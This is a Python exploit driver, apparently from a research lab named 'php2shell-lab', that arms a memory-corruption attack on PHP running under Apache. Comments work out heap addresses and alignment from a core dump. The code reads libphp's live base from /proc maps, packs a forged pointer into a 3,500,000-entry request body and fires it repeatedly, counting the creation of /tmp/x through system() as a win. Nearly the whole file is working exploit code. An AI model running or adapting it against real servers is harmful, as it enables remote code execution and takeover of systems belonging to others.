#!/usr/bin/env python3
"""oom141h: ARM phase with core-measured B (from /tmp/core.141 inside phpbuild).
measure gate PASSED in oom141g (rdi == SIG8 exact at VLEN=295, N=3500000).
SIG8 heap vaddr 0x7f3be08681a0 -> str_val/B(base) = 0x7f3be0868158 (mod16=8).
k law: k+184<=295 -> k<=111; B= str_val+k must be mod16=8 -> k%16==0; key-safe k>=96.
-> k=96 forced. B = str_val + 96 = 0x7f3be08681b8.
"""
import struct, sys
sys.path.insert(0, "/Users/vlad/Projects/queue/php2shell-lab")
import importlib.util
spec = importlib.util.spec_from_file_location("oom141", "/Users/vlad/Projects/queue/php2shell-lab/oom141.py")
oom = importlib.util.module_from_spec(spec)
spec.loader.exec_module(oom)  # main() guarded by __name__ == "__main__"

# CRITICAL: BASE is set inside oom141.main(); importing skips it -> free_obj
# = BASE+ZIF = raw file vaddr (oom141h v1 crash: rip=zif_system, unmapped).
# Read the LIVE base from the running container's apache master maps.
_base_line = oom.sh("grep -m1 libphp /proc/1/maps")
oom.BASE = int(_base_line.split("-")[0], 16)
print("live BASE=0x%x (%s)" % (oom.BASE, _base_line), flush=True)

STR_VAL = 0x7f3be0868158
K = 96
B = STR_VAL + K
VLEN = 295
N = 3500000
TRIES = 3

print("=== oom141h arm: B=0x%x k=%d VLEN=%d N=%d ===" % (B, K, VLEN, N), flush=True)
ptr8 = struct.pack("<Q", B)
body = oom.build_body(ptr8, N, arm=(B, K), vlen=VLEN)
print("wire len:", len(body), flush=True)
for t in range(TRIES):
    r = oom.fire(body, N, t)
    if oom.x_state() == "X_EXISTS":
        print("WIN WIN WIN: /tmp/x EXISTS (try %d)" % t, flush=True)
        break
    # if the worker crashed, N fatal needs a fresh worker; body identical each try
else:
    print("arm done, no x after %d tries" % TRIES, flush=True)
print("final x:", oom.x_state(), flush=True)
print("=== done ===", flush=True)
